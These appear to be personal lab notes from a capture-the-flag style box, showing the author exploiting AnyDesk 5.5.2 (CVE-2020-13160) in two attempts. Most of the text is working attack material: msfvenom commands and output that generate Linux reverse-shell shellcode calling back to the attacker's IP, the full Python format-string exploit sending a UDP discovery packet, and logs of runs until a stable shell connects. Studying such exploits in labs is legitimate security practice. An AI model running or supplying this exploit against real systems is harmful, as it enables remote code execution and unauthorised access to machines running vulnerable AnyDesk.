
https://www.exploit-db.com/exploits/49613
https://devel0pment.de/?p=1881

```sh
┌──(kali㉿kali)-[~/Downloads]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.21.236 LPORT=443 -b "\x00\x25\x26" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 680 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x83\xf9\x55"
shellcode += b"\x7c\xd7\xd1\xaa\xab\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xe9\xd0\x0d\xe5\xbd"
shellcode += b"\xd3\xf5\xc1\x82\xa7\x5a\x79\x9f\x46\xe2\x12"
shellcode += b"\x81\xf9\x54\xc7\xdd\xc3\xbf\x47\xd2\xb1\xdc"
shellcode += b"\x9a\xbd\xc1\xf0\xc1\xa9\xa1\x5a\x79\xbd\xd2"
shellcode += b"\xf4\xe3\x7c\x37\x3f\x5d\x8f\xde\xaf\xde\x75"
shellcode += b"\x93\x6e\x24\x4e\x99\x11\x84\xe1\x90\x3b\x53"
shellcode += b"\xa4\xb9\xaa\xf8\xcb\x70\xb2\x2e\x80\x99\x23"
shellcode += b"\x4d\x8c\xfc\x55\x7c\xd7\xd1\xaa\xab"
```

full python:
```python
# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '10.10.46.86'
port = 50001 #UDP

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.21.236 LPORT=443 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x83\xf9\x55"
shellcode += b"\x7c\xd7\xd1\xaa\xab\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xe9\xd0\x0d\xe5\xbd"
shellcode += b"\xd3\xf5\xc1\x82\xa7\x5a\x79\x9f\x46\xe2\x12"
shellcode += b"\x81\xf9\x54\xc7\xdd\xc3\xbf\x47\xd2\xb1\xdc"
shellcode += b"\x9a\xbd\xc1\xf0\xc1\xa9\xa1\x5a\x79\xbd\xd2"
shellcode += b"\xf4\xe3\x7c\x37\x3f\x5d\x8f\xde\xaf\xde\x75"
shellcode += b"\x93\x6e\x24\x4e\x99\x11\x84\xe1\x90\x3b\x53"
shellcode += b"\xa4\xb9\xaa\xf8\xcb\x70\xb2\x2e\x80\x99\x23"
shellcode += b"\x4d\x8c\xfc\x55\x7c\xd7\xd1\xaa\xab"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
```

This should work.
I tried the exploit and it still doesn't work.

I uninstalled anydesk again:
```sh
┌──(kali㉿kali)-[~]
└─$ ss -tulpn              
Netid       State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port      Process       
udp         UNCONN       0            0                        0.0.0.0:50001                  0.0.0.0:*                       
udp         UNCONN       0            0                        0.0.0.0:54440                  0.0.0.0:*                       
tcp         LISTEN       0            10                       0.0.0.0:7070                   0.0.0.0:*                       
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo apt remove anydesk                  
REMOVING:                       
  anydesk

Summary:
  Upgrading: 0, Installing: 0, Removing: 1, Not Upgrading: 0
  Freed space: 17.2 MB

Continue? [Y/n] y
(Reading database ... 478090 files and directories currently installed.)
Removing anydesk (6.3.2) ...
Removed "/etc/systemd/system/multi-user.target.wants/anydesk.service".
Processing triggers for desktop-file-utils (0.27-2) ...
Processing triggers for hicolor-icon-theme (0.17-2) ...
Processing triggers for mailcap (3.70+nmu1) ...
Processing triggers for kali-menu (2023.4.7) ...
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ ss -tulpn                                
Netid       State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port      Process       
udp         UNCONN       0            0                        0.0.0.0:54440                  0.0.0.0:*         ┌──(kali㉿kali)-[~/exploits]
└─$ python3 CVE-2020-13160.py
sending payload ...
<socket.socket fd=3, family=2, type=2, proto=0, laddr=('0.0.0.0', 0)>
<socket.socket fd=3, family=2, type=2, proto=0, laddr=('0.0.0.0', 50678)>
reverse shell should connect within 5 seconds
```

still nothing! same with metasploit, restarting.. again

the same

After getting the tip to switch the ip every try, meaning re-running msfvenom, I ran it about 15 times more before getting a short .5s shell
I continued and finally said, this is the last try for today, then it worked and I got a really stable shell that did not die at all!
It's still running two hours later though I switched to ssh some time ago.

the one that finally worked:
```sh
┌──(kali㉿kali)-[~/exploits]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.21.236 LPORT=6670 -b "\x00\x25\x26" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 680 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xc7\x3e\x35"
shellcode += b"\x7f\x85\x64\x96\x52\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xad\x17\x6d\xe6\xef"
shellcode += b"\x66\xc9\x38\xc6\x60\x3a\x7a\xcd\xf3\xde\xeb"
shellcode += b"\xc5\x3e\x2f\x71\x8f\x76\x83\xbe\x96\x76\xbc"
shellcode += b"\x99\xef\x74\xcc\x38\xed\x66\x3a\x7a\xef\x67"
shellcode += b"\xc8\x1a\x38\xf0\x5f\x5e\xdd\x6b\x93\x27\x31"
shellcode += b"\x54\x0e\x27\x1c\x2c\x2d\x7d\xa5\x57\x5b\x50"
shellcode += b"\xf6\x0c\x96\x01\x8f\xb7\xd2\x2d\xd2\x2c\x1f"
shellcode += b"\xb4\xc8\x3b\x35\x7f\x85\x64\x96\x52"
```

I also ran the original exploit though Garr ran mine for python3 and it worked too:
```python
# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '10.10.245.157'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.21.236 LPORT=6670 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xc7\x3e\x35"
shellcode += b"\x7f\x85\x64\x96\x52\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xad\x17\x6d\xe6\xef"
shellcode += b"\x66\xc9\x38\xc6\x60\x3a\x7a\xcd\xf3\xde\xeb"
shellcode += b"\xc5\x3e\x2f\x71\x8f\x76\x83\xbe\x96\x76\xbc"
shellcode += b"\x99\xef\x74\xcc\x38\xed\x66\x3a\x7a\xef\x67"
shellcode += b"\xc8\x1a\x38\xf0\x5f\x5e\xdd\x6b\x93\x27\x31"
shellcode += b"\x54\x0e\x27\x1c\x2c\x2d\x7d\xa5\x57\x5b\x50"
shellcode += b"\xf6\x0c\x96\x01\x8f\xb7\xd2\x2d\xd2\x2c\x1f"
shellcode += b"\xb4\xc8\x3b\x35\x7f\x85\x64\x96\x52"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
```

```sh
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py
sending payload ...
reverse shell should connect within 5 seconds
```